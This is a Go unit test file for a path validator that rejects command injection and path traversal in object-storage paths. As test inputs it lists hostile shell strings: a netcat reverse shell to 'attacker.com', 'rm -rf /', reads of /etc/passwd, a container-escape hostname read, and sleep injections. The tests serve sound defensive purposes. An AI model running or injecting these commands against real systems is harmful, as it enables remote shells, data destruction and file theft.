package validator

import (
	"strings"
	"testing"
)

func TestPathValidator_ValidateOSSPath(t *testing.T) {
	validator := NewPathValidator()

	tests := []struct {
		name    string
		path    string
		wantErr bool
		errMsg  string
	}{
		// Valid paths
		{
			name:    "empty path should be allowed",
			path:    "",
			wantErr: false,
		},
		{
			name:    "simple path",
			path:    "test/project",
			wantErr: false,
		},
		{
			name:    "path with hyphens",
			path:    "my-project/workspace",
			wantErr: false,
		},
		{
			name:    "path with underscores",
			path:    "my_project/my_workspace",
			wantErr: false,
		},
		{
			name:    "path with dots",
			path:    "project.v1/workspace.prod",
			wantErr: false,
		},
		{
			name:    "path with numbers",
			path:    "project123/workspace456",
			wantErr: false,
		},
		{
			name:    "complex valid path",
			path:    "org-123/project_v2.0/workspace-prod",
			wantErr: false,
		},

		// Command injection attempts - semicolon
		{
			name:    "command injection with semicolon",
			path:    "test; rm -rf /",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "command injection with semicolon and echo",
			path:    "/test; echo === HOST ESCAPED === >&2",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "real attack from issue - cat hostname",
			path:    "/test; cat /proc/1/root/etc/hostname",
			wantErr: true,
			errMsg:  "dangerous characters",
		},

		// Command injection attempts - command substitution
		{
			name:    "command substitution with $()",
			path:    "test$(whoami)",
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "command substitution with ${}",
			path:    "test${USER}",
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "command substitution in middle",
			path:    "test/$(date)/workspace",
			wantErr: true,
			errMsg:  "command substitution",
		},
		{
			name:    "attack example from curl request",
			path:    "exec-$(date",
			wantErr: true,
			errMsg:  "command substitution",
		},

		// Command injection attempts - backticks
		{
			name:    "command substitution with backticks",
			path:    "test`whoami`",
			wantErr: true,
			errMsg:  "dangerous characters",
		},

		// Command injection attempts - pipes and redirects
		{
			name:    "pipe operator",
			path:    "test | cat",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "redirect operator",
			path:    "test > /tmp/file",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "redirect operator append",
			path:    "test >> /tmp/file",
			wantErr: true,
			errMsg:  "dangerous characters",
		},

		// Command injection attempts - logical operators
		{
			name:    "logical AND",
			path:    "test && malicious",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "logical OR",
			path:    "test || malicious",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "background execution",
			path:    "test & background",
			wantErr: true,
			errMsg:  "dangerous characters",
		},

		// Command injection attempts - quotes
		{
			name:    "single quotes",
			path:    "test'malicious'",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "double quotes",
			path:    `test"malicious"`,
			wantErr: true,
			errMsg:  "dangerous characters",
		},

		// Path traversal attempts
		{
			name:    "path traversal with double dots",
			path:    "../../etc/passwd",
			wantErr: true,
			errMsg:  "path traversal",
		},
		{
			name:    "path traversal in middle",
			path:    "test/../../../secret",
			wantErr: true,
			errMsg:  "path traversal",
		},

		// Invalid characters
		{
			name:    "backslash",
			path:    "test\\malicious",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "parentheses",
			path:    "test(malicious)",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "exclamation mark",
			path:    "test!malicious",
			wantErr: true,
			errMsg:  "dangerous characters",
		},

		// Edge cases
		{
			name:    "path too long",
			path:    strings.Repeat("a", 1025), // > 1024
			wantErr: true,
			errMsg:  "too long",
		},
		{
			name:    "consecutive slashes",
			path:    "test//workspace",
			wantErr: true,
			errMsg:  "consecutive slashes",
		},
		{
			name:    "space in path",
			path:    "test workspace",
			wantErr: true,
			errMsg:  "invalid characters",
		},

		// Real-world attack examples
		{
			name:    "container escape attempt",
			path:    "/test; cat /proc/1/root/etc/hostname",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "reverse shell attempt",
			path:    "test; nc -e /bin/sh attacker.com 4444",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
		{
			name:    "sleep command injection",
			path:    "/test; echo === HOST ESCAPED === >&2; sleep 999",
			wantErr: true,
			errMsg:  "dangerous characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateOSSPath(tt.path)

			if tt.wantErr {
				if err == nil {
					t.Errorf("ValidateOSSPath() expected error but got none for path: %q", tt.path)
					return
				}
				if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateOSSPath() error = %v, expected error message to contain %q", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateOSSPath() unexpected error = %v for valid path: %q", err, tt.path)
				}
			}
		})
	}
}

func TestPathValidator_SanitizePath(t *testing.T) {
	validator := NewPathValidator()

	tests := []struct {
		name string
		path string
		want string
	}{
		{
			name: "remove leading slash",
			path: "/test/project",
			want: "test/project",
		},
		{
			name: "remove trailing slash",
			path: "test/project/",
			want: "test/project",
		},
		{
			name: "remove both leading and trailing slashes",
			path: "/test/project/",
			want: "test/project",
		},
		{
			name: "trim spaces",
			path: "  test/project  ",
			want: "test/project",
		},
		{
			name: "empty path",
			path: "",
			want: "",
		},
		{
			name: "path with only slashes",
			path: "///",
			want: "",
		},
		{
			name: "normal path no changes needed",
			path: "test/project",
			want: "test/project",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := validator.SanitizePath(tt.path)
			if got != tt.want {
				t.Errorf("SanitizePath() = %v, want %v", got, tt.want)
			}
		})
	}
}

// TestPathValidator_CommandInjectionVectors tests specific command injection patterns
func TestPathValidator_CommandInjectionVectors(t *testing.T) {
	validator := NewPathValidator()

	// Common command injection vectors
	dangerousInputs := []string{
		"; ls",
		"| cat /etc/passwd",
		"& whoami",
		"$(whoami)",
		"`whoami`",
		"${USER}",
		"|| echo hacked",
		"&& malicious",
		"> /tmp/hacked",
		">> /tmp/hacked",
		"< /etc/passwd",
		"; rm -rf /",
		"; cat /proc/1/root/etc/hostname",
		"test\nmalicious",
		"test\rmalicious",
		"test;malicious",
	}

	for _, input := range dangerousInputs {
		t.Run("dangerous_input_"+input, func(t *testing.T) {
			err := validator.ValidateOSSPath(input)
			if err == nil {
				t.Errorf("ValidateOSSPath() should reject dangerous input: %q", input)
			}
		})
	}
}

// BenchmarkPathValidator_ValidateOSSPath_Valid benchmarks validation of valid paths
func BenchmarkPathValidator_ValidateOSSPath_Valid(b *testing.B) {
	validator := NewPathValidator()
	path := "org-123/project_v2.0/workspace-prod"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.ValidateOSSPath(path)
	}
}

// BenchmarkPathValidator_ValidateOSSPath_Invalid benchmarks validation of invalid paths
func BenchmarkPathValidator_ValidateOSSPath_Invalid(b *testing.B) {
	validator := NewPathValidator()
	path := "test; rm -rf /"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = validator.ValidateOSSPath(path)
	}
}
